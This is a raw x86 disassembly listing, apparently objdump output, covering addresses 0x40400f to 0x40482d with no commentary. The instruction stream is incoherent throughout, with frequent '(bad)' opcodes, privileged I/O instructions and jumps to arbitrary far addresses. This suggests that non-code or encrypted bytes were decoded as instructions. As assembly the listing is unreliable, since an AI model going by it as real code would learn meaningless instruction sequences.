  40400f:	xchg   DWORD PTR [edx-0x21],ebx
  404012:	xchg   ecx,eax
  404013:	dec    eax
  404014:	(bad)  [edx+eax*1]
  404017:	ds leave 
  404019:	lahf   
  40401a:	movnti DWORD PTR [ecx+eax*1],edx
  40401e:	sbb    edi,ebx
  404020:	pop    edx
  404021:	div    BYTE PTR [esi+edi*4+0x57c48511]
  404028:	add    eax,0x998e5a9
  40402d:	(bad)  
  40402e:	shl    edx,1
  404030:	jbe    0x404086
  404032:	nop
  404033:	mov    eax,0xd95fbfce
  404038:	mov    ch,0xbc
  40403a:	push   cs
  40403b:	aas    
  40403c:	pop    ss
  40403d:	test   al,0x28
  40403f:	jecxz  0x404066
  404041:	sbb    BYTE PTR [edx-0x56],bh
  404044:	ja     0x40402f
  404046:	push   es
  404047:	out    0xf,al
  404049:	call   DWORD PTR [ebx]
  40404b:	jmp    0x4040cc
  40404d:	icebp  
  40404e:	ins    BYTE PTR es:[edi],dx
  40404f:	and    al,ch
  404051:	and    eax,0xebb7a24
  404056:	mov    eax,ds:0x36ce57e5
  40405b:	inc    ebp
  40405c:	and    ah,BYTE PTR [ecx]
  40405e:	sub    al,0x24
  404060:	addr16 daa 
  404062:	lods   al,BYTE PTR gs:[esi]
  404064:	jno    0x4040a4
  404066:	int3   
  404067:	cmp    eax,esi
  404069:	ret    0x8f11
  40406c:	inc    edx
  40406d:	ins    BYTE PTR es:[edi],dx
  40406e:	(bad)  
  40406f:	out    dx,al
  404070:	adc    BYTE PTR ds:0x9468f4a4,ch
  404076:	(bad)  
  404077:	jle    0x40408b
  404079:	inc    edx
  40407a:	rol    DWORD PTR [ecx+0x67],cl
  40407d:	and    BYTE PTR ds:0xf19a536,cl
  404083:	cmp    DWORD PTR [ebx+0x4b1f106a],eax
  404089:	jbe    0x40407b
  40408b:	sub    BYTE PTR [edx-0x32],dh
  40408e:	pushf  
  40408f:	ins    DWORD PTR es:[edi],dx
  404090:	shl    DWORD PTR [edi],0x5e
  404093:	jmp    0xc065:0xcded3515
  40409a:	and    ecx,DWORD PTR [ecx]
  40409c:	int3   
  40409d:	clc    
  40409e:	pop    esi
  40409f:	mov    cl,0xc3
  4040a1:	call   0x3ae801d
  4040a6:	inc    esi
  4040a7:	sub    BYTE PTR [edx],al
  4040a9:	(bad)  
  4040ab:	je     0x404052
  4040ad:	cwde   
  4040ae:	jae    0x4040b0
  4040b0:	ins    DWORD PTR es:[edi],dx
  4040b1:	jnp    0x4040a5
  4040b3:	enter  0xc05a,0x45
  4040b7:	enter  0xbd39,0xba
  4040bb:	jg     0x4040de
  4040bd:	je     0x404084
  4040bf:	mov    cl,0xc0
  4040c1:	mov    ah,0xe9
  4040c3:	imul   esi,DWORD PTR [edi+0x4],0x38
  4040c7:	and    cl,BYTE PTR [edi-0x1c]
  4040ca:	dec    esp
  4040cb:	mov    DWORD PTR ds:0x8672067,0xcb2000eb
  4040d5:	sub    DWORD PTR [ecx-0x64],ecx
  4040d8:	push   0x61
  4040da:	sub    al,0x57
  4040dc:	fiadd  DWORD PTR [bp+si]
  4040df:	adc    ebp,ebp
  4040e1:	dec    ebx
  4040e2:	pop    ds
  4040e3:	sub    BYTE PTR [edx+0x30],0x9
  4040e7:	stc    
  4040e8:	std    
  4040e9:	icebp  
  4040ea:	pop    edx
  4040eb:	dec    ebx
  4040ec:	jb     0x404076
  4040ee:	scas   al,BYTE PTR es:[edi]
  4040ef:	inc    eax
  4040f0:	(bad)  
  4040f1:	jmp    0x70352a5f
  4040f6:	mov    ah,0x41
  4040f8:	cmc    
  4040f9:	or     BYTE PTR [esi+0x2ef7b0ce],bh
  4040ff:	add    ecx,DWORD PTR [edi]
  404101:	loop   0x40417a
  404103:	and    edi,DWORD PTR [edx-0x51]
  404106:	aam    0x84
  404108:	mov    ah,0xc5
  40410a:	xchg   ecx,eax
  40410b:	xor    ch,BYTE PTR [ebp-0x13d361f1]
  404111:	xchg   ebx,eax
  404112:	push   ebp
  404113:	loopne 0x4040f5
  404115:	frstor [edx+0x6b]
  404118:	sbb    al,0x12
  40411a:	or     eax,0xf5897181
  40411f:	dec    ecx
  404120:	and    eax,0x722a28c1
  404125:	push   0x15
  404127:	push   ss
  404128:	int    0x16
  40412a:	adc    esi,ebp
  40412c:	into   
  40412d:	jecxz  0x404142
  40412f:	mov    dl,0xad
  404131:	mov    bl,0xa5
  404133:	dec    ebx
  404134:	daa    
  404135:	push   ds
  404136:	stc    
  404137:	pop    esp
  404138:	jp     0x4040c8
  40413a:	fistp  WORD PTR [edi-0x40]
  40413d:	cld    
  40413e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40413f:	jb     0x404150
  404141:	push   0x6
  404143:	mov    cl,0xcd
  404145:	pushf  
  404146:	in     eax,dx
  404147:	cwde   
  404148:	jns    0x4041bc
  40414a:	ins    DWORD PTR es:[edi],dx
  40414b:	sbb    dh,0x29
  40414e:	repnz out 0x4d,al
  404151:	sub    DWORD PTR [eax+0x7b],0x9bae3981
  404158:	scas   eax,DWORD PTR es:[edi]
  404159:	push   0xfffffffd
  40415b:	mov    dh,0x61
  40415d:	and    eax,0xa324e24b
  404162:	mov    esi,0xdd3de460
  404167:	fcomp  st(4)
  404169:	lds    eax,FWORD PTR [edx-0x4b]
  40416c:	cmp    al,0x44
  40416e:	or     eax,0x7ca46a88
  404173:	ficom  WORD PTR [ecx+0x1bb5c096]
  404179:	jmp    0x198d1a
  40417e:	daa    
  40417f:	pop    ecx
  404180:	dec    ebp
  404181:	fs jno 0x4041d7
  404184:	mov    edi,0x51d2d047
  404189:	sbb    eax,0xdbe07b34
  40418e:	lods   al,BYTE PTR ds:[esi]
  40418f:	(bad)  
  404190:	(bad)  
  404191:	mov    eax,ds:0x37b5d005
  404196:	lahf   
  404197:	es scas eax,DWORD PTR es:[edi]
  404199:	popf   
  40419a:	push   ebx
  40419b:	pop    eax
  40419c:	sub    al,0xc9
  40419e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40419f:	popa   
  4041a0:	mov    ah,0xb6
  4041a2:	push   es
  4041a3:	push   ebp
  4041a4:	jns    0x4041c0
  4041a6:	push   esp
  4041a7:	jbe    0x4041a8
  4041a9:	sub    eax,0x61362c30
  4041ae:	rcl    DWORD PTR ss:[eax],1
  4041b1:	jo     0x404199
  4041b3:	scas   eax,DWORD PTR es:[edi]
  4041b4:	lahf   
  4041b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041b6:	cmp    al,0xb1
  4041b8:	lea    ecx,[ecx-0x64]
  4041bb:	out    dx,al
  4041bc:	or     eax,ebp
  4041be:	lahf   
  4041bf:	inc    edi
  4041c0:	shl    DWORD PTR [ecx+0x29],1
  4041c3:	psrlw  mm4,QWORD PTR [eax]
  4041c6:	lahf   
  4041c7:	mov    bh,BYTE PTR [ebx-0x21224c4a]
  4041cd:	daa    
  4041ce:	add    al,0x4b
  4041d0:	mov    edi,0x90072b63
  4041d5:	xlat   BYTE PTR ds:[ebx]
  4041d6:	in     al,0xda
  4041d8:	test   BYTE PTR [edi],cl
  4041da:	faddp  st(5),st
  4041dc:	or     ch,BYTE PTR [esi+edx*8]
  4041df:	adc    esp,DWORD PTR [ebx+edi*8+0x68e5263d]
  4041e6:	inc    eax
  4041e7:	or     al,0x69
  4041e9:	rcl    BYTE PTR [ebp-0x3c],cl
  4041ec:	mov    eax,0x8abc1993
  4041f1:	out    0x16,al
  4041f3:	leave  
  4041f4:	imul   esi,DWORD PTR [eax],0xc4192063
  4041fa:	dec    esp
  4041fb:	pop    es
  4041fc:	push   edx
  4041fd:	jle    0x4041be
  4041ff:	fcomp  QWORD PTR [ebp-0x6c098668]
  404205:	sub    eax,0x20331705
  40420a:	ror    BYTE PTR [edx-0x28],cl
  40420d:	imul   esp,edi,0x5c
  404210:	(bad)  [esi+edi*1]
  404213:	push   esp
  404214:	sub    eax,edi
  404216:	sub    cl,BYTE PTR [eax+0x6f087d56]
  40421c:	cmp    esi,DWORD PTR [eax]
  40421e:	mov    WORD PTR gs:[ebx+eiz*2+0x2f68040],cs
  404226:	xor    al,0xb4
  404228:	inc    esi
  404229:	sub    bl,BYTE PTR [ebx+0x75]
  40422c:	clc    
  40422d:	inc    ebp
  40422e:	(bad)  
  40422f:	sbb    bh,BYTE PTR ds:0x2a3be503
  404235:	jmp    0xdb4943dc
  40423a:	or     esp,DWORD PTR [esp+esi*1+0x1d]
  40423e:	adc    bh,ah
  404240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404241:	adc    eax,0x7d699156
  404246:	mul    bh
  404248:	mov    bh,0x4c
  40424a:	jp     0x40427e
  40424c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40424d:	dec    esi
  40424e:	rol    DWORD PTR [edi],cl
  404250:	mov    ds:0x9f91b0b7,al
  404255:	in     al,0x8b
  404257:	mov    al,0x41
  404259:	mov    ecx,0x32daa8ec
  40425e:	in     al,0x82
  404260:	xchg   edi,eax
  404261:	and    BYTE PTR [ecx-0xa44a119],cl
  404267:	fmul   QWORD PTR [ebx+0x17f1474a]
  40426d:	sbb    ebx,eax
  40426f:	lds    eax,FWORD PTR [eax+0x1997479]
  404275:	mov    dl,0xe2
  404277:	ret    0x2c5f
  40427a:	dec    ecx
  40427b:	call   0x87648352
  404280:	cmp    dh,dl
  404282:	mov    dh,0xec
  404284:	inc    dl
  404286:	hlt    
  404287:	int3   
  404288:	ret    
  404289:	(bad)  
  40428a:	aas    
  40428b:	inc    edi
  40428c:	shl    BYTE PTR [edi+0x5],cl
  40428f:	mov    ch,0x28
  404291:	mov    eax,ds:0x5832d4c5
  404296:	mov    al,0x2a
  404298:	(bad)  
  404299:	push   ds
  40429a:	test   dh,0xe3
  40429d:	out    dx,eax
  40429e:	imul   esp,DWORD PTR [ecx-0x325f1547],0xd20d70fc
  4042a8:	je     0x4042c3
  4042aa:	add    bl,BYTE PTR [ecx+0x6d89aab7]
  4042b0:	aam    0x14
  4042b2:	push   es
  4042b3:	and    BYTE PTR [eax],0x83
  4042b6:	shl    BYTE PTR [esi+eax*4-0x7a],cl
  4042ba:	jmp    0x4042c7
  4042bc:	cmp    DWORD PTR [edi-0x423a371f],ebx
  4042c2:	adc    BYTE PTR [ebp-0x403875f4],bh
  4042c8:	add    dh,ch
  4042ca:	(bad)  
  4042cb:	mov    dl,0x9d
  4042cd:	stc    
  4042ce:	dec    eax
  4042cf:	cmp    ch,BYTE PTR [esp+edx*8+0x4e]
  4042d3:	stos   BYTE PTR es:[edi],al
  4042d4:	push   es
  4042d5:	fs call 0xde3bf83f
  4042db:	test   BYTE PTR [edi+0x3d0b80bb],bl
  4042e1:	call   0x4a1241ba
  4042e6:	mov    eax,ds:0x86400c48
  4042eb:	push   eax
  4042ec:	pusha  
  4042ed:	scas   al,BYTE PTR es:[edi]
  4042ee:	enter  0x9c5a,0x69
  4042f2:	iret   
  4042f3:	and    bl,bh
  4042f5:	pusha  
  4042f6:	mov    al,0x3d
  4042f8:	dec    ebx
  4042f9:	push   esi
  4042fa:	xchg   edx,eax
  4042fb:	push   0xa8090ef4
  404300:	fs jg  0x404323
  404303:	sbb    eax,0x5d58800d
  404308:	mov    edi,DWORD PTR [ecx+0x2367ce83]
  40430e:	dec    edx
  40430f:	push   ds
  404310:	cmp    ebp,DWORD PTR [eax]
  404312:	or     esp,DWORD PTR [ebp+0x2376f457]
  404318:	push   ebp
  404319:	shl    ebx,0x9
  40431c:	sub    bh,BYTE PTR [esi]
  40431e:	std    
  40431f:	or     dh,BYTE PTR [ebp-0x1e]
  404322:	mov    ecx,0x40631fc0
  404327:	mov    cl,0x5e
  404329:	jmp    0x4042fc
  40432b:	push   0x3fb1aea5
  404330:	cli    
  404331:	adc    DWORD PTR [ebp+0x40358bcc],eax
  404337:	mov    ?,WORD PTR [edx]
  404339:	push   ebx
  40433a:	jb     0x404362
  40433c:	cmp    al,0x8f
  40433e:	popf   
  40433f:	mov    al,ds:0x31fb15e
  404344:	cld    
  404345:	jnp    0x40436a
  404347:	push   edx
  404348:	bound  eax,QWORD PTR [ebp+eax*8+0x65]
  40434c:	loop   0x404351
  40434e:	pop    esp
  40434f:	test   al,0xd7
  404351:	imul   edi,edi,0x3bc4ca13
  404357:	sti    
  404358:	xchg   DWORD PTR [edi-0x77],edx
  40435b:	imul   esi,DWORD PTR [ebx+ecx*1],0xffffffe3
  40435f:	ret    
  404360:	mov    WORD PTR [ecx-0x306e5b0b],es
  404366:	or     ecx,esp
  404368:	xor    al,0x46
  40436a:	ins    DWORD PTR es:[edi],dx
  40436b:	popa   
  40436c:	addr16 mov bh,0x53
  40436f:	adc    BYTE PTR [eax],0x72
  404372:	jmp    DWORD PTR [ebp+0x3e]
  404375:	(bad)  
  404376:	stc    
  404377:	das    
  404378:	pminub mm1,QWORD PTR [ecx+0x3307246e]
  40437f:	out    0xa7,eax
  404381:	scas   al,BYTE PTR es:[edi]
  404382:	enter  0x51f,0x9a
  404386:	enter  0x70e2,0x8f
  40438a:	mov    WORD PTR ds:0x37af9fe,fs
  404390:	fwait
  404391:	or     DWORD PTR [edx],0x50
  404394:	sti    
  404395:	xor    BYTE PTR [edx-0x6d2014b],bh
  40439b:	and    dh,ah
  40439d:	aam    0xb0
  40439f:	mov    bh,0xfa
  4043a1:	mov    ebx,0xc82ba04
  4043a6:	inc    ebp
  4043a7:	lock mov bl,0x1e
  4043aa:	rol    DWORD PTR [esi+eax*1],0x8c
  4043ae:	loop   0x404367
  4043b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043b1:	shl    ch,0xc6
  4043b4:	add    edi,DWORD PTR [eax-0x18a25f8e]
  4043ba:	sub    al,0xd6
  4043bc:	aad    0x91
  4043be:	into   
  4043bf:	lea    edx,[ecx+0x32]
  4043c2:	test   BYTE PTR [eax+0x56],dh
  4043c5:	pop    esi
  4043c6:	shl    DWORD PTR [edi-0x479014ea],cl
  4043cc:	call   0x4a64:0x33e9bde7
  4043d3:	sbb    DWORD PTR [esi-0x2c10aeef],0xffffffab
  4043da:	dec    ebx
  4043db:	mov    ch,0xe
  4043dd:	cmc    
  4043de:	lds    ebx,FWORD PTR [edx+edi*4+0x7c15ecc0]
  4043e5:	pop    esi
  4043e6:	push   edx
  4043e7:	xchg   ecx,eax
  4043e8:	dec    esi
  4043e9:	(bad)  
  4043ea:	(bad)  
  4043ec:	pop    edx
  4043ed:	mov    ecx,0x2d0ede2e
  4043f2:	adc    DWORD PTR [edx-0x46],0x53d2e2b7
  4043f9:	test   BYTE PTR [ebx-0x5a],bh
  4043fc:	xchg   edi,eax
  4043fd:	fmul   st(4),st
  4043ff:	scas   al,BYTE PTR es:[edi]
  404400:	dec    ecx
  404401:	fdiv   DWORD PTR [edx+0x29]
  404404:	imul   esp,DWORD PTR [esi-0x593f217],0x2befe546
  40440e:	adc    edi,DWORD PTR [ebx-0x1a838b60]
  404414:	fs rcr edx,0xea
  404418:	cwde   
  404419:	mov    BYTE PTR [ecx+esi*2-0x11efedfd],al
  404420:	add    al,0x4
  404422:	imul   esp,DWORD PTR [edi],0x639f0197
  404428:	fiadd  WORD PTR ds:0x1031224f
  40442e:	pusha  
  40442f:	cmp    ah,BYTE PTR [ebx]
  404431:	(bad)  
  404432:	dec    esi
  404433:	pop    ecx
  404434:	(bad)  
  404435:	mov    ch,0x84
  404437:	sbb    eax,0x67e281aa
  40443c:	push   ds
  40443d:	xchg   ebx,eax
  40443e:	xor    ecx,DWORD PTR [esi]
  404440:	jmp    0xa034:0x8e6b0e
  404447:	loope  0x4044bf
  404449:	sti    
  40444a:	add    eax,0xd74a438d
  40444f:	adc    DWORD PTR [eax+0x63e036de],ebx
  404455:	out    dx,al
  404456:	leave  
  404457:	(bad)  
  404458:	outs   dx,DWORD PTR ds:[esi]
  404459:	mov    al,ds:0x758dbda4
  40445e:	pusha  
  40445f:	sub    esp,DWORD PTR [esi]
  404461:	cdq    
  404462:	rcl    BYTE PTR [edx+0x6e474afa],1
  404468:	dec    esp
  404469:	add    al,BYTE PTR [ebx+esi*8]
  40446c:	mov    eax,ds:0xdf1feb7c
  404471:	cmp    esp,DWORD PTR [ecx+edx*2+0x79f39984]
  404478:	and    al,BYTE PTR [ebp-0x5820716e]
  40447e:	int    0x16
  404480:	push   esi
  404481:	lds    ebx,FWORD PTR [bp+0x7ebe]
  404486:	aaa    
  404487:	pause  
  404489:	push   es
  40448a:	pop    ebp
  40448b:	push   cs
  40448c:	out    dx,eax
  40448d:	scas   al,BYTE PTR es:[edi]
  40448e:	or     DWORD PTR [eax+edx*2+0xf],ecx
  404492:	fist   WORD PTR [ebx-0x7]
  404495:	sbb    BYTE PTR [ecx],ah
  404497:	fwait
  404498:	test   DWORD PTR [eax+0xf],ebp
  40449b:	push   eax
  40449c:	jae    0x4044e9
  40449e:	pop    ebx
  40449f:	idiv   BYTE PTR ds:[esi+0x2c]
  4044a3:	inc    ebx
  4044a4:	push   ss
  4044a5:	xor    edi,0x60
  4044a8:	ror    eax,0xcd
  4044ab:	daa    
  4044ac:	xchg   edi,eax
  4044ad:	sbb    al,0xda
  4044b0:	test   al,0xfd
  4044b2:	clc    
  4044b3:	mov    edi,0x20fd1901
  4044b8:	cmp    BYTE PTR [edx],bh
  4044ba:	mov    WORD PTR ds:0xa3a4d00c,ss
  4044c0:	mul    DWORD PTR [esi]
  4044c2:	bound  edx,QWORD PTR [edx]
  4044c4:	call   0x9f93bc8b
  4044c9:	pop    edi
  4044ca:	jo     0x40452b
  4044cc:	inc    ebp
  4044cd:	fidiv  WORD PTR [ecx]
  4044cf:	fcom   QWORD PTR [ecx-0x307801dd]
  4044d5:	lahf   
  4044d6:	call   0xbf2:0x417ffc5
  4044dd:	pop    ds
  4044de:	sbb    esi,ebp
  4044e0:	xchg   esi,eax
  4044e1:	jecxz  0x40453d
  4044e3:	add    ecx,ecx
  4044e5:	pop    ebp
  4044e6:	add    edi,DWORD PTR [ebx]
  4044e8:	sub    DWORD PTR [ecx+0x4dc6c343],edx
  4044ee:	retf   
  4044ef:	in     eax,0x17
  4044f1:	div    DWORD PTR [eax+0x77]
  4044f4:	mov    ds:0x26e35a6,al
  4044f9:	pop    edx
  4044fa:	xchg   ebx,eax
  4044fb:	mov    esi,0x60d090b8
  404500:	push   edi
  404501:	push   ecx
  404502:	out    dx,al
  404503:	ss (bad) 
  404505:	das    
  404506:	ror    DWORD PTR [edi],cl
  404508:	xchg   edi,eax
  404509:	xor    eax,0x6f78c9f1
  40450e:	or     eax,DWORD PTR [ebp+0x29]
  404511:	add    BYTE PTR [eax+0x68d07636],ah
  404517:	leave  
  404518:	jmp    0x4652:0xd05d362
  40451f:	ss loop 0x404512
  404522:	or     edx,DWORD PTR [eax-0x71]
  404525:	mov    ds:0xb5deefb8,eax
  40452a:	aad    0xa7
  40452c:	ins    DWORD PTR es:[edi],dx
  40452d:	xchg   BYTE PTR [edi+eiz*2-0x275a3e56],al
  404534:	out    dx,eax
  404535:	clc    
  404536:	push   0xffffffbd
  404538:	fucomip st,st(5)
  40453a:	sub    eax,0xfbc830f
  40453f:	or     DWORD PTR [edi+0x47],ebx
  404542:	sub    esi,0xf9a44ad
  404548:	cmp    al,0xb1
  40454a:	inc    esp
  40454b:	outs   dx,BYTE PTR ds:[esi]
  40454c:	pop    esi
  40454d:	or     BYTE PTR [ebx],ch
  40454f:	xchg   ebx,eax
  404550:	mov    edi,0x468fe663
  404555:	sahf   
  404556:	bound  edx,QWORD PTR [eax-0x1f]
  404559:	xor    ebx,esp
  40455b:	dec    esi
  40455c:	ins    DWORD PTR es:[edi],dx
  40455d:	fs dec edi
  40455f:	and    al,ch
  404561:	int3   
  404562:	sbb    BYTE PTR [edi+0x20],al
  404565:	or     bh,BYTE PTR [ecx]
  404567:	sbb    DWORD PTR [edx],esp
  404569:	sbb    eax,DWORD PTR [edi-0x7f]
  40456c:	mov    bl,0xca
  40456e:	ds enter 0xb515,0xff
  404573:	xor    BYTE PTR [edx],dh
  404575:	ret    0x5f67
  404578:	sub    bh,ah
  40457a:	adc    DWORD PTR [ebx+0x59],0x37391efd
  404581:	repz shl BYTE PTR [ecx+0x60341df0],cl
  404588:	inc    esi
  404589:	and    dl,0x32
  40458c:	retf   0x8ed3
  40458f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404590:	cld    
  404591:	xchg   ah,ch
  404593:	jnp    0x404541
  404595:	dec    ebp
  404596:	inc    eax
  404597:	sar    BYTE PTR [ebp+0x49],0x6
  40459b:	and    dh,BYTE PTR [esi+0x203da325]
  4045a1:	mov    edi,0xd41f4590
  4045a6:	push   ss
  4045a7:	xlat   BYTE PTR ds:[ebx]
  4045a8:	rcr    BYTE PTR [ebp-0x4f],cl
  4045ab:	mov    ds:0x2ccda637,al
  4045b0:	cli    
  4045b1:	mov    ebp,0xe126029c
  4045b6:	jmp    0xf4ab7d2d
  4045bb:	cdq    
  4045bc:	jb     0x4045fb
  4045be:	ds in  eax,dx
  4045c0:	and    edi,DWORD PTR [eax]
  4045c2:	nop
  4045c3:	mov    ah,0x2
  4045c5:	lods   eax,DWORD PTR ds:[esi]
  4045c6:	call   0x577ab117
  4045cb:	push   ecx
  4045cc:	push   ebp
  4045cd:	cwde   
  4045ce:	jmp    0x421ff965
  4045d3:	into   
  4045d4:	push   cs
  4045d5:	push   es
  4045d6:	xchg   ecx,eax
  4045d7:	mov    ds:0xc9f5e730,eax
  4045dc:	in     eax,dx
  4045dd:	lods   al,BYTE PTR ds:[esi]
  4045de:	pop    ebp
  4045df:	and    DWORD PTR [eax+0x5c],esi
  4045e2:	xchg   esp,eax
  4045e3:	dec    edx
  4045e4:	gs pop ds
  4045e6:	jno    0x4045a8
  4045e8:	pop    ebx
  4045e9:	out    0x6,al
  4045eb:	inc    ebp
  4045ec:	sub    DWORD PTR [edx-0x18c75610],esi
  4045f2:	mov    BYTE PTR [ecx-0x45fff022],al
  4045f8:	pop    edi
  4045f9:	push   0x583025b6
  4045fe:	fxch   st(4)
  404600:	xor    DWORD PTR [esi+0x79],esp
  404603:	xchg   edi,eax
  404604:	xor    eax,0xcebacbc2
  404609:	call   0x8437:0x43df8558
  404610:	pop    es
  404611:	inc    esi
  404612:	lahf   
  404613:	in     al,dx
  404614:	test   eax,0x19338b39
  404619:	xchg   DWORD PTR [edx-0x31fd6615],edi
  40461f:	push   ebp
  404620:	inc    esi
  404621:	mov    eax,DWORD PTR [ebp+0x61]
  404624:	inc    esi
  404625:	inc    edi
  404626:	add    ebp,DWORD PTR ds:0x79ba90df
  40462c:	jecxz  0x4045fb
  40462e:	hlt    
  40462f:	ja     0x4045f1
  404631:	xor    al,0xa4
  404633:	pusha  
  404634:	psubq  mm1,QWORD PTR [ecx-0x76]
  404638:	int    0x19
  40463a:	pop    es
  40463b:	pop    ds
  40463c:	imul   bh
  40463e:	into   
  40463f:	nop
  404640:	adc    eax,0xab55e112
  404645:	mov    edi,0x549553ce
  40464a:	add    BYTE PTR [ecx+eax*4-0x6d],bl
  40464e:	mov    ah,0x27
  404650:	arpl   WORD PTR [ebx],sp
  404652:	fsubr  DWORD PTR [esi+esi*1]
  404655:	push   ebx
  404656:	pop    es
  404657:	iret   
  404658:	(bad)  
  404659:	mov    cl,0xaf
  40465b:	sub    BYTE PTR [ebx+0x23],ch
  40465e:	and    BYTE PTR [edx],ah
  404660:	aad    0xdb
  404662:	or     eax,0xc5e65f6f
  404667:	xor    DWORD PTR [esi-0x4fc11dd9],edx
  40466d:	scas   eax,DWORD PTR es:[edi]
  40466e:	mov    al,ds:0xc4c993c
  404673:	jb     0x404640
  404675:	mov    dl,0xdf
  404677:	pusha  
  404678:	pop    edi
  404679:	ds (bad) 
  40467b:	push   ebp
  40467c:	test   eax,0x83cd349a
  404681:	dec    ebx
  404682:	ins    BYTE PTR es:[edi],dx
  404683:	bound  ecx,QWORD PTR [eax-0x7d9d6ca9]
  404689:	jle    0x4046a3
  40468b:	addr16 (bad) 
  40468d:	jnp    0x4046aa
  40468f:	sti    
  404690:	jb     0x404645
  404692:	(bad)  
  404694:	data16 sub BYTE PTR [ebx],cl
  404697:	mov    edx,0xd7f19669
  40469c:	jecxz  0x404689
  40469e:	add    edx,ebx
  4046a0:	mov    ecx,0x1ac9e590
  4046a5:	data16 (bad) 
  4046a8:	mul    DWORD PTR [ebx]
  4046aa:	fidivr WORD PTR [ebx+0x22]
  4046ad:	mov    BYTE PTR [esi-0x45],dl
  4046b0:	sahf   
  4046b1:	cmc    
  4046b2:	mov    ecx,0x1e07a92d
  4046b7:	test   eax,0x9b6b99a3
  4046bc:	xchg   ecx,eax
  4046bd:	idiv   DWORD PTR [ebx-0x8]
  4046c0:	pop    eax
  4046c1:	mov    esp,0x93f66dd4
  4046c6:	xchg   esi,eax
  4046c7:	leave  
  4046c8:	rcr    dl,cl
  4046ca:	outs   dx,DWORD PTR ds:[esi]
  4046cb:	push   cs
  4046cc:	cmp    esp,DWORD PTR [ecx+eiz*1-0x63c989e0]
  4046d3:	fist   DWORD PTR [ecx+0x6bfd69d0]
  4046d9:	add    cl,BYTE PTR [ecx+0x703e6827]
  4046df:	dec    edx
  4046e0:	or     eax,0x33939a80
  4046e5:	mov    eax,0x6874d9fc
  4046ea:	pushf  
  4046eb:	sub    bl,BYTE PTR [ebx-0x6f05575b]
  4046f1:	mov    esp,0x8303fe90
  4046f6:	retf   
  4046f7:	ja     0x404743
  4046f9:	retf   
  4046fa:	inc    esi
  4046fb:	imul   edx,DWORD PTR [eax+0x6ac33bb3],0x49
  404702:	lods   al,BYTE PTR ds:[esi]
  404703:	pop    edx
  404704:	inc    edx
  404705:	cmp    bl,BYTE PTR [edx]
  404707:	sahf   
  404708:	pop    esi
  404709:	icebp  
  40470a:	cmp    BYTE PTR [eax+0x5c7c8322],ah
  404710:	mov    al,0xfc
  404712:	rcr    BYTE PTR [edi+ebp*4],1
  404715:	and    eax,0x346174aa
  40471a:	arpl   WORD PTR [ecx],bp
  40471c:	mov    bl,bl
  40471e:	fimul  DWORD PTR [esi]
  404720:	icebp  
  404721:	test   BYTE PTR [ebx+0x38],al
  404724:	jae    0x4046f1
  404726:	fs cli 
  404728:	adc    BYTE PTR [ebp+0x7cfc0159],bh
  40472e:	imul   esp,DWORD PTR [ecx-0x48afe666],0xffffffe7
  404735:	mov    al,ds:0x10528625
  40473a:	retf   0xc0bd
  40473d:	pop    eax
  40473e:	pop    edi
  40473f:	inc    ebp
  404740:	or     BYTE PTR [esi+0x5fb2c8f9],dh
  404746:	scas   al,BYTE PTR es:[edi]
  404747:	xlat   BYTE PTR ds:[ebx]
  404748:	inc    esi
  404749:	xlat   BYTE PTR ss:[ebx]
  40474b:	cmp    BYTE PTR [edi+0x27],0x50
  40474f:	inc    edi
  404750:	loopne 0x4047bd
  404752:	inc    ecx
  404753:	shr    BYTE PTR [esi+ecx*8-0x2f4364cb],0xc1
  40475b:	and    eax,0x4cf299ee
  404760:	inc    esi
  404761:	jb     0x4047bf
  404763:	adc    ah,cl
  404765:	add    dl,ch
  404767:	push   ebx
  404768:	call   0x70d799ae
  40476d:	inc    esp
  40476e:	aaa    
  40476f:	ds jbe 0x40479d
  404772:	bound  esp,QWORD PTR [ecx]
  404774:	mov    edi,0x13b98539
  404779:	sub    al,0x2c
  40477b:	add    esi,DWORD PTR [ebx+0x2082d192]
  404781:	xchg   edx,eax
  404782:	enter  0xdc97,0xad
  404786:	xchg   esp,eax
  404787:	and    DWORD PTR [edi+0x2779d9e6],ebx
  40478d:	mov    WORD PTR [ebx+ebx*1-0x6af5bdff],fs
  404794:	mov    edx,0xb8571e54
  404799:	cli    
  40479a:	inc    ecx
  40479b:	shl    BYTE PTR [esi+ebx*8-0x74a1a181],cl
  4047a2:	stos   BYTE PTR es:[edi],al
  4047a3:	inc    ebp
  4047a4:	or     eax,0x37c542d5
  4047a9:	cdq    
  4047aa:	mov    edx,0x35e13f37
  4047af:	fcom   st(7)
  4047b1:	adc    BYTE PTR [edx+0xc],bh
  4047b4:	cmp    al,ch
  4047b6:	jmp    0x40481b
  4047b8:	into   
  4047b9:	in     eax,dx
  4047ba:	loope  0x404774
  4047bc:	aam    0x98
  4047be:	sub    eax,0x8af561e8
  4047c3:	mov    edx,ebp
  4047c5:	cmp    BYTE PTR ds:0xf5afce67,bh
  4047cb:	call   0x44c27898
  4047d0:	ret    0x4d97
  4047d3:	ins    DWORD PTR es:[edi],dx
  4047d4:	lahf   
  4047d5:	and    DWORD PTR [edx+0x26],ebx
  4047d8:	fiadd  DWORD PTR [ebx+0x5fb341b]
  4047de:	jae    0x404808
  4047e0:	mov    edx,0xfe8ffb32
  4047e5:	mov    dh,0x75
  4047e7:	or     ch,BYTE PTR [ebp*4+0x1990dd06]
  4047ee:	mov    DWORD PTR [eax+0x1af6ab6e],ebp
  4047f4:	xor    al,0x4a
  4047f6:	retf   
  4047f7:	popf   
  4047f8:	ds aas 
  4047fa:	and    eax,0xcc0706f4
  4047ff:	jo     0x4047bf
  404801:	push   ecx
  404802:	out    0xea,eax
  404804:	js     0x4047ea
  404806:	leave  
  404807:	test   DWORD PTR [ecx-0x62],eax
  40480a:	test   BYTE PTR [eax+edi*4+0x2f34fe1b],0xd3
  404812:	push   ebx
  404813:	xchg   edx,eax
  404814:	iret   
  404815:	daa    
  404816:	fild   DWORD PTR [edx-0x54]
  404819:	dec    ecx
  40481a:	mov    ds:0xf4f0b96,eax
  40481f:	scas   al,BYTE PTR es:[edi]
  404820:	push   ds
  404821:	in     eax,dx
  404822:	sub    ebx,0x53dca87d
  404828:	mov    eax,ds:0x88d2040b
  40482d:	mov    fs,ebx
